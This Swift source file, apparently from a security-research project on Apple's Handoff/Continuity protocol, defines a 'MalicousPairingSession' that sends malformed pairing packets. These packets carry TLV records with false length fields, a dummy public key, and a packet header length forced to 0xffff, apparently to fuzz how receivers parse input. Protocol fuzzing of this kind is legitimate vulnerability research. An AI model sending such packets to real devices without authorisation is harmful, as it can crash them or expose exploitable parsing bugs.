//
//  MalicousPairingSession.swift
//  Handoff-Swift
//
//  Created by Alexander Heinrich on 27.08.19.
//  Copyright © 2019 Alexander Heinrich. All rights reserved.
//

import Foundation

class MalicousPairingSession: PairingSession {
    
    let attack: PairingAttack
    
    init(attack: PairingAttack) throws {
        self.attack = attack
        try super.init()
    }
    
    override func createInitializePairingData() throws -> Data {
        if self.attack != .tlvFakeLength {
            //Perform default implementation
            return try super.createInitializePairingData()
        }
        
        //Create a pairing TLV that contains invalid length parameters. Several tests will be performed
        
        //1. Send Empty public key and claim that is 32 bytes long
        //2. Send Appflags Integer and claim that is larger than one UInt8

        
        var tlvBox = TLV8Box()

        
        
        //Add the packet number (state)
        tlvBox.addInt(withType: PairingTLV.state, andValue: 1)
        //Add the value for 0x19 (guessing that this means the pairing should start).
        tlvBox.addInt(withType: PairingTLV.appFlags, andValue: 1)
        
        //Add the public key TLV
//        let pubKeyData = sessionKeys.publicKey
        //1.Empty public key®
        let pubKeyData = Data(repeating: 0x01, count: 32)
        
        log("Creating pairing packet with public key: \(pubKeyData.hexadecimal)")
        
        tlvBox.addValue(withType: PairingTLV.publicKey, andLength: UInt8(crypto_box_PUBLICKEYBYTES), andValue: pubKeyData)
        
        return try tlvBox.serialize()
    }
    
    override func startKeyExchange() throws {
        if self.attack != .malicousContinuityPacket {
            return try super.startKeyExchange()
        }
        
        // Send own packet
        log("Sending first packet with public Key -- M1")
        let intialPacketData = try createInitializePairingData()
        let pairingData = try opackPairingData(fromSerializedTLV: intialPacketData)
        var firstPacket = ContinuityPacket(headerType: .pairVerifyPublicKey, body: pairingData)
        
        //Set the packet length to max
        firstPacket.header = try ContinuityPacket.Header(data: Data([0x05,0x00, 0xff, 0xff]))
        
        try self.connection?.send(packet: firstPacket)
    }
    
    override func receivedStartPairingResponse(responseTLV: TLV8Box) throws {
        //Received the response to the malicious TLV -> Check the content
        print("TLV received as M2:", responseTLV.toDictionary())
    }
    
    
    enum PairingAttack {
        case tlvFakeLengthPubKey
        case tlvFakeLengthAppFlags
        case tlvFakeLengthEncryptedData
        case tlvFakeLength
        case malicousOPACK
        case malicousContinuityPacket
    }
}
